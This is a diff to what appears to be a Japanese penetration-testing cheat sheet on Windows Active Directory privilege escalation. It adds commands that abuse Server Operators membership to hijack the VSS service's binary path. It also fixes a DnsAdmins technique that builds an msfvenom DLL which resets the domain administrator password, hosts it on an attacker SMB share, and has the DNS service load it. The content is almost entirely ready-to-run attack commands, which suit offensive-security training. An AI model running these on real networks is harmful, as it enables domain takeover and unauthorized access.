@@ -95,13 +95,20 @@ Server Operators # Windows ServerやActive Directory環境において、サー�
 DnsAdmins # Active Directoryにデフォルトで存在する組み込みグループでDNSサーバーの設定を変更することで任意のDLLを読み込ませるDLLインジェクションが可能。
 ```
 
+## ServerOperatorsの悪用による権限昇格
+```bash
+sc.exe config vss binPath="<任意のファイル, コマンド>"
+sc.exe stop vss
+sc.exe start vss
+```
+
 ## DnsAdminsの悪用によるDLLインジェクション
 ```bash
-msfvenom -p windows/x64/exec cmd='net user administrator Password123! /domain' -f dll > dnssetup.dll
+msfvenom -p windows/x64/exec cmd='net user administrator P@ssword123! /domain' -f dll > dnssetup.dll
 impacket-smbserver share $(pwd) -smb2support
 # Windows
 Get-Service -Name DNS
-dnscmd localhost /config /serverlovelplugindll \\<Kali IP>\share\dnssetup.dll
+dnscmd localhost /config /serverlevelplugindll \\<Kali IP>\share\dnssetup.dll
 reg.exe query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
 sc.exe stop dns
 sc.exe start dns
